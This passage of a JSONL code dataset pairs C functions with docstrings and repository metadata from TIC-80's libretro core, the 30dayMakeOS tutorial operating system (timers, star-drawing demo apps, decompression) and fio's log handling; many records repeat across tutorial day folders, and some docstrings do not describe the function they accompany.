RETRO_DEVICE_ID_MOUSE_HORIZ_WHEELUP) > 0) {\n\t\tmouse->scrollx = 1;\n\t} else if (input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_HORIZ_WHEELDOWN) > 0) {\n\t\tmouse->scrollx = -1;\n\t}\n\tif (input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_WHEELUP) > 0) {\n\t\tmouse->scrolly = 1;\n\t} else if (input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_WHEELDOWN) > 0) {\n\t\tmouse->scrolly = -1;\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Get information about the desired audio and video.\n */\n", "func_signal": "RETRO_API void retro_get_system_av_info(struct retro_system_av_info *info)", "code": "{\n\tinfo->timing = (struct retro_system_timing) {\n\t\t.fps = TIC80_FRAMERATE,\n\t\t.sample_rate = TIC80_SAMPLERATE,\n\t};\n\n\tinfo->geometry = (struct retro_game_geometry) {\n\t\t.base_width   = TIC80_FULLWIDTH,\n\t\t.base_height  = TIC80_FULLHEIGHT,\n\t\t.max_width    = TIC80_FULLWIDTH,\n\t\t.max_height   = TIC80_FULLHEIGHT,\n\t\t.aspect_ratio = (float)TIC80_FULLWIDTH / (float)TIC80_FULLHEIGHT,\n\t};\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Draw the screen.\n */\n", "func_signal": "void tic80_libretro_draw(tic80* game)", "code": "{\n\t// Render the mouse cursor if needed.\n\ttic80_libretro_mousecursor((tic80_local*)game, &state->input.mouse, state->mouseCursor);\n\n\t// Render to the screen.\n\tvideo_cb(game->screen, TIC80_FULLWIDTH, TIC80_FULLHEIGHT, TIC80_FULLWIDTH << 2);\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Tells the core to unload the game.\n */\n", "func_signal": "RETRO_API void retro_unload_game(void)", "code": "{\n\tif (state != NULL) {\n\t\tif (state->tic != NULL) {\n\t\t\ttic80_delete(state->tic);\n\t\t\tstate->tic = NULL;\n\t\t}\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Gets region of memory. Used for achievement tracking.\n */\n", "func_signal": "RETRO_API void *retro_get_memory_data(unsigned id)", "code": "{\n\tif (state == NULL || state->tic == NULL || id >= TIC_PERSISTENT_SIZE) {\n\t\treturn NULL;\n\t}\n\n\ttic80_local* tic80 = (tic80_local*)state->tic;\n\treturn &(tic80->memory->ram.persistent.data[id]);\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Draws a software cursor on the screen where the mouse is.\n */\n", "func_signal": "void tic80_libretro_mousecursor(tic80_local* game, tic80_mouse* mouse, int cursortype)", "code": "{\n\t// Only draw the mouse cursor if it's active.\n\tif (state->mouseHideTimer == 0) {\n\t\treturn;\n\t}\n\n\t// Determine which cursor to draw.\n\tswitch (cursortype) {\n\t\tcase 1: // Dot\n\t\t\ttic_api_pix(game->memory, mouse->x, mouse->y, 15, false);\n\t\tbreak;\n\t\tcase 2: // Cursor\n\t\t\ttic_api_line(game->memory, mouse->x - 4, mouse->y, mouse->x - 2, mouse->y, 15);\n\t\t\ttic_api_line(game->memory, mouse->x + 2, mouse->y, mouse->x + 4, mouse->y, 15);\n\t\t\ttic_api_line(game->memory, mouse->x, mouse->y - 4, mouse->x, mouse->y - 2, 15);\n\t\t\ttic_api_line(game->memory, mouse->x, mouse->y + 2, mouse->x, mouse->y + 4, 15);\n\t\tbreak;\n\t\tcase 3: // Arrow\n\t\t\ttic_api_tri(game->memory, mouse->x, mouse->y, mouse->x + 3, mouse->y, mouse->x, mouse->y + 3, 15);\n\t\t\ttic_api_line(game->memory, mouse->x + 3, mouse->y, mouse->x, mouse->y + 3, 0);\n\t\tbreak;\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Retrieve keyboard information from libretro.\n */\n", "func_signal": "void tic80_libretro_update_keyboard(tic80_keyboard* keyboard)", "code": "{\n\t// Clear the key buffer.\n\tfor (int i = 0; i < TIC80_KEY_BUFFER; i++) {\n\t\tkeyboard->keys[i] = tic_key_unknown;\n\t}\n\n\t// Load up the active keys into the buffer.\n\tfor (int key = RETROK_FIRST, keyBuffer = 0; key < RETROK_LAST && keyBuffer < TIC80_KEY_BUFFER; key++) {\n\t\tif (input_state_cb(0, RETRO_DEVICE_KEYBOARD, 0, key)) {\n\t\t\tkeyboard->keys[keyBuffer++] = state->keymap[key];\n\t\t}\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/27_day/haribote/timer.c", "commit_date": "2016-05-17 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/20_day/timer.c", "commit_date": "2016-04-29 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/14_day/timer.c", "commit_date": "2016-04-21 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars2\");\n\tapi_boxfilwin(win + 1,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win + 1, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tapi_refreshwin(win,  6, 26, 144, 94);\n\tapi_end();\n}", "path": "30dayMakeOS/24_day/stars2.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u4e4b\u95f4\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars\");\n\tapi_boxfilwin(win,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tfor (;;) {\n\t\tif (api_getkey(1) == 0x0a) {\n\t\t\tbreak; /*\u6309\u4e0b\u56de\u8f66\u952e\u5219break; */\n\t\t}\n\t}\n\tapi_end();\n}", "path": "30dayMakeOS/28_day/stars/stars.c", "commit_date": "2016-05-18 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/16_day/timer.c", "commit_date": "2016-04-25 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/28_day/haribote/timer.c", "commit_date": "2016-05-18 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u4e4b\u95f4\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars\");\n\tapi_boxfilwin(win,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tfor (;;) {\n\t\tif (api_getkey(1) == 0x0a) {\n\t\t\tbreak; /*\u6309\u4e0b\u56de\u8f66\u952e\u5219break; */\n\t\t}\n\t}\n\tapi_end();\n}", "path": "30dayMakeOS/29_day/stars/stars.c", "commit_date": "2016-05-19 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u4e4b\u95f4\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars\");\n\tapi_boxfilwin(win,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tapi_end();\n}", "path": "30dayMakeOS/24_day/stars.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u4e4b\u95f4\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars\");\n\tapi_boxfilwin(win,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tfor (;;) {\n\t\tif (api_getkey(1) == 0x0a) {\n\t\t\tbreak; /*\u6309\u4e0b\u56de\u8f66\u952e\u5219break; */\n\t\t}\n\t}\n\tapi_end();\n}", "path": "30dayMakeOS/27_day/stars/stars.c", "commit_date": "2016-05-17 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars2\");\n\tapi_boxfilwin(win + 1,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win + 1, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tapi_refreshwin(win,  6, 26, 144, 94);\n\tapi_end();\n}", "path": "30dayMakeOS/23_day/stars2.c", "commit_date": "2016-05-10 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars2\");\n\tapi_boxfilwin(win + 1,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win + 1, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tapi_refreshwin(win,  6, 26, 144, 94);\n\tapi_end();\n}", "path": "30dayMakeOS/25_day/stars2.c", "commit_date": "2016-05-13 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/21_day/timer.c", "commit_date": "2016-05-04 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/17_day/timer.c", "commit_date": "2016-04-26 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u6700\u521d\u6ca1\u6709\u6b63\u5728\u8fd0\u884c\u7684\u5b9a\u65f6\u5668 */\n\ttimerctl.using = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\ttimerctl.timers0[i].flags = 0; /* \u672a\u4f7f\u7528 */\n\t}\n\treturn;\n}", "path": "30dayMakeOS/12_day/timer.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/13_day/timer.c", "commit_date": "2016-04-20 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\u4ea7\u751f0\uff5e32767\u7684\u968f\u673a\u6570*/\n", "func_signal": "void HariMain(void)", "code": "{\n\tchar *buf;\n\tint win, i, x, y;\n\tapi_initmalloc();\n\tbuf = api_malloc(150 * 100);\n\twin = api_openwin(buf, 150, 100, -1, \"stars2\");\n\tapi_boxfilwin(win + 1,  6, 26, 143, 93, 0);/*\u9ed1\u8272*/\n\tfor (i = 0; i < 50; i++) {\n\t\tx = (rand() % 137) +  6;\n\t\ty = (rand() %  67) + 26;\n\t\tapi_point(win + 1, x, y, 3);/*\u9ec4\u8272*/\n\t}\n\tapi_refreshwin(win,  6, 26, 144, 94);\n\tapi_end();\n}", "path": "30dayMakeOS/26_day/stars2.c", "commit_date": "2016-05-16 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \u5b9a\u65f6\u5668\u8fd0\u884c\u4e2d */\n", "func_signal": "void init_pit(void)", "code": "{\n\tint i;\n\tstruct TIMER *t;\n\tio_out8(PIT_CTRL, 0x34);\n\tio_out8(PIT_CNT0, 0x9c);\n\tio_out8(PIT_CNT0, 0x2e);\n\ttimerctl.count = 0;\n\tfor (i = 0; i < MAX_TIMER; i++) {\n\t\ttimerctl.timers0[i].flags = 0; /* \u6ca1\u6709\u4f7f\u7528 */\n\t}\n\tt = timer_alloc(); /* \u53d6\u5f97\u4e00\u4e2a */\n\tt->timeout = 0xffffffff;\n\tt->flags = TIMER_FLAGS_USING;\n\tt->next = 0; /* \u672b\u5c3e */\n\ttimerctl.t0 = t; /* \u56e0\u4e3a\u73b0\u5728\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4ed6\u5c31\u5728\u6700\u524d\u9762*/\n\ttimerctl.next = 0xffffffff; /* \u56e0\u4e3a\u53ea\u6709\u54e8\u5175\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u8d85\u65f6\u65f6\u523b\u5c31\u662f\u54e8\u5175\u7684\u65f6\u523b */\n\treturn;\n}", "path": "30dayMakeOS/19_day/timer.c", "commit_date": "2016-04-28 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \uff08\u6ce8\uff09memcmp\u548cstrncmp\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u51fd\u6570\u5ffd\u7565\u5b57\u7b26\u4e32\u4e2d\u76840\u5e76\u4e00\u76f4\u6bd4\u8f83\u5230\u6307\u5b9a\u768415\u4e2a\u5b57\u7b26\u4e3a\u6b62*/\n", "func_signal": "int tek_decomp(unsigned char *p, char *q, int size)", "code": "{\n\tint err = -1;\n\tif (*p == 0x83) {\n\t\terr = tek_decode1(size, p, q);\n\t} else if (*p == 0x85) {\n\t\terr = tek_decode2(size, p, q);\n\t} else if (*p == 0x89) {\n\t\terr = tek_decode5(size, p, q);\n\t}\n\tif (err != 0) {\n\t\treturn -1; /*\u5931\u8d25*/\n\t}\n\treturn 0;\t/*\u6210\u529f*/\n}", "path": "30dayMakeOS/30_day/tek/tek.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/* \uff08\u6ce8\uff09memcmp\u548cstrncmp\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u51fd\u6570\u5ffd\u7565\u5b57\u7b26\u4e32\u4e2d\u76840\u5e76\u4e00\u76f4\u6bd4\u8f83\u5230\u6307\u5b9a\u768415\u4e2a\u5b57\u7b26\u4e3a\u6b62*/\n", "func_signal": "int tek_decomp(unsigned char *p, char *q, int size)", "code": "{\n\tint err = -1;\n\tif (*p == 0x83) {\n\t\terr = tek_decode1(size, p, q);\n\t} else if (*p == 0x85) {\n\t\terr = tek_decode2(size, p, q);\n\t} else if (*p == 0x89) {\n\t\terr = tek_decode5(size, p, q);\n\t}\n\tif (err != 0) {\n\t\treturn -1; /*\u5931\u8d25*/\n\t}\n\treturn 0;\t/*\u6210\u529f*/\n}", "path": "30dayMakeOS/29_day/haribote/tek.c", "commit_date": "2016-05-19 00:00:00", "repo_name": "yourtion/30dayMakeOS", "stars": 5580, "license": "other", "language": "c", "size": 3579}
{"docstring": "/*\n * Inflate stored compressed chunks, or write them directly to the log\n * file if so instructed.\n */\n", "func_signal": "static int inflate_gz_chunks(struct io_log *log, FILE *f)", "code": "{\n\tstruct inflate_chunk_iter iter = { .chunk_sz = log->log_gz, };\n\tz_stream stream;\n\n\twhile (!flist_empty(&log->chunk_list)) {\n\t\tstruct iolog_compress *ic;\n\n\t\tic = flist_first_entry(&log->chunk_list, struct iolog_compress, list);\n\t\tflist_del(&ic->list);\n\n\t\tif (log->log_gz_store) {\n\t\t\tsize_t ret;\n\n\t\t\tdprint(FD_COMPRESS, \"log write chunk size=%lu, \"\n\t\t\t\t\"seq=%u\\n\", (unsigned long) ic->len, ic->seq);\n\n\t\t\tret = fwrite(ic->buf, ic->len, 1, f);\n\t\t\tif (ret != 1 || ferror(f)) {\n\t\t\t\titer.err = errno;\n\t\t\t\tlog_err(\"fio: error writing compressed log\\n\");\n\t\t\t}\n\t\t} else\n\t\t\tinflate_chunk(ic, log->log_gz_store, f, &stream, &iter);\n\n\t\tfree_chunk(ic);\n\t}\n\n\tif (iter.seq) {\n\t\tfinish_chunk(&stream, f, &iter);\n\t\tfree(iter.buf);\n\t}\n\n\treturn iter.err;\n}", "path": "fio/iolog.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "axboe/fio", "stars": 4773, "license": "gpl-2.0", "language": "c", "size": 30028}
